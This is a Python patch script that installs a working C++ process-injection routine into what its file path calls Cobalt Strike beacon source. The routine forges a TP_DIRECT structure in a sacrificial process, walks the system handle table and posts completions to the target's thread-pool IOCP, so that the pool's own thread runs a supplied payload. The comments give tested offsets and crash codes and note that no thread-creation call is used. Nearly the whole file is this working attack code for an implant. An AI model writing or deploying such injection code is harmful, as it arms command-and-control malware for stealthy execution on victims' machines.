# -*- coding: utf-8 -*-
"""patch_tpdirect.py - replace the inject_via_tpdirect scaffold DECLINE in
inject_tier2.cpp with the real implementation (C-25: empirically closed on
2026-11-13, tools/tpd_harness.py 3/3 PASS @ Callback +0x38)."""
P = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon\feat-post-4.9.1\src\inject_tier2.cpp"
s = open(P, "rb").read()

old = b"""BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
	(void)context; (void)lpStartAddress; (void)lpParameter;
	spawn_log("tpdirect: scaffold decline (research pending)", 0x7fffffff);
	return FALSE;
}"""

new = b"""BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
	/* SafeBreach "Process Injection Using Windows Thread Pools" variant 7 -
	 * CLOSED empirically 2026-11-13 (tools/tpd_harness.py, 3/3 exit 0x1337):
	 * the target pool's IOCP dequeues a completion whose KeyContext is our
	 * forged TP_DIRECT and TpDirectCallback calls the Callback field, which
	 * on Win10 19044 x64 sits at +0x38 (0x08/0x10/0x18 fast-fail the pool
	 * with 0xC0000409, 0x40 lands on the adjacent field -> 0xC0000005).
	 * No thread-creation primitive is used anywhere - the dequeuing worker
	 * is the target's own pool thread.
	 *
	 * Chain:
	 *   1. fork&run: resume the suspended patsy and give init a moment -
	 *      the thread pool does not exist before LdrInitializeThunk lands
	 *   2. VirtualAllocEx the 0x60-byte TP_DIRECT {RefCount=1,
	 *      Callback@0x38 = lpStartAddress}
	 *   3. walk the target handle table (SystemExtendedHandleInformation),
	 *      DuplicateHandle every handle into us and NtSetIoCompletion each
	 *      with our direct pointer as KeyContext. The kernel rejects every
	 *      non-IOCP object (0xC0000024); the pool's IOCP accepts and fires.
	 *
	 * Note: TpDirectCallback invokes Callback(direct, ...) - the thread
	 * parameter does NOT ride through (same limitation as the official
	 * technique; self-locating PIC payloads and our asyncdll, which reads
	 * its arguments from the patched __POSTEX_USER_ARGS__ buffer, work;
	 * kit DLLs that read lpReserved do not). */
	typedef NTSTATUS(WINAPI * NTSETIOCOMPLETION)(HANDLE, PVOID, PVOID, PVOID, PVOID);
	typedef NTSTATUS(WINAPI * NTQUERYSYSINFO)(ULONG, PVOID, ULONG, PULONG);

	HMODULE nt = GetModuleHandleA("ntdll.dll");
	if (nt == NULL)
		return FALSE;
	NTSETIOCOMPLETION pSetIo = (NTSETIOCOMPLETION)GetProcAddress(nt, "NtSetIoCompletion");
	NTQUERYSYSINFO pQuerySys = (NTQUERYSYSINFO)GetProcAddress(nt, "NtQuerySystemInformation");
	if (pSetIo == NULL || pQuerySys == NULL) {
		spawn_log("tpdirect: ntdll apis missing", 0x7fffffff);
		return FALSE;
	}

	/* 1. fork&run needs a live pool */
	if (context->isSuspended && context->hThread != NULL) {
		if (ResumeThread(context->hThread) == (DWORD)-1) {
			spawn_log("tpdirect: ResumeThread failed gle=", (long)GetLastError());
			return FALSE;
		}
		Sleep(2000);
		spawn_log("tpdirect: patsy resumed, pool warmup wait done", 0x7fffffff);
	}

	HANDLE hProcess = context->hProcess;
	DWORD pid = context->pid;

	/* 2. TP_DIRECT */
	unsigned char * direct = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x60,
	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (direct == NULL) {
		spawn_log("tpdirect: direct alloc failed gle=", (long)GetLastError());
		return FALSE;
	}
	{
		unsigned char buf[0x60];
		memset(buf, 0, sizeof(buf));
		*(unsigned int *)(buf + 0x00) = 1;                                   /* RefCount */
		*(unsigned long long *)(buf + 0x38) = (unsigned long long)(size_t)lpStartAddress;
		SIZE_T got = 0;
		if (!beacon_WriteProcessMemory(hProcess, direct, buf, sizeof(buf), &got) || got != sizeof(buf)) {
			spawn_log("tpdirect: direct write failed gle=", (long)GetLastError());
			return FALSE;
		}
	}
	spawn_log("tpdirect: direct armed=", (long)(long long)(size_t)direct);

	/* 3. handle-table walk + post */
	ULONG len = 0x100000;
	unsigned char * hbuf = (unsigned char *)malloc(len);
	if (hbuf == NULL)
		return FALSE;
	NTSTATUS st;
	while (TRUE) {
		st = pQuerySys(64 /*SystemExtendedHandleInformation*/, hbuf, len, &len);
		if (st == 0xC0000004 /*STATUS_INFO_LENGTH_MISMATCH*/) {
			unsigned char * nb = (unsigned char *)realloc(hbuf, len);
			if (nb == NULL) {
				free(hbuf);
				return FALSE;
			}
			hbuf = nb;
			continue;
		}
		break;
	}
	if (st != 0) {
		spawn_log("tpdirect: handle walk failed st=", (long)st);
		free(hbuf);
		return FALSE;
	}

	ULONG_PTR count = *(ULONG_PTR *)hbuf;
	ULONG_PTR posted = 0, accepted = 0;
	unsigned char * row = hbuf + 16; /* header: count(8) + pad(8) */
	HANDLE me = GetCurrentProcess();
	for (ULONG_PTR i = 0; i < count; i++, row += 40) {
		ULONG_PTR hpid = *(ULONG_PTR *)(row + 8);
		ULONG_PTR hval = *(ULONG_PTR *)(row + 16);
		if (hpid != (ULONG_PTR)pid || hval == 0 || hval > 0xFFFFFFFF)
			continue;
		HANDLE dup = NULL;
		if (!DuplicateHandle(hProcess, (HANDLE)(size_t)hval, me, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
			continue;
		posted++;
		NTSTATUS s2 = pSetIo(dup, direct, NULL, NULL, NULL);
		CloseHandle(dup);
		if (s2 == 0) {
			accepted++;
		}
	}
	free(hbuf);
	spawn_log("tpdirect: posted=", (long)posted);
	spawn_log("tpdirect: accepted iocp=", (long)accepted);
	if (accepted == 0) {
		spawn_log("tpdirect: no pool iocp accepted", 0x7fffffff);
		return FALSE;
	}

	/* the pool dequeues asynchronously; our caller treats TRUE as injected */
	Sleep(500);
	spawn_log("tpdirect: armed and queued", 0x7fffffff);
	return TRUE;
}"""

assert s.count(old) == 1, s.count(old)
s = s.replace(old, new)
open(P, "wb").write(s)
print("tpdirect body installed")
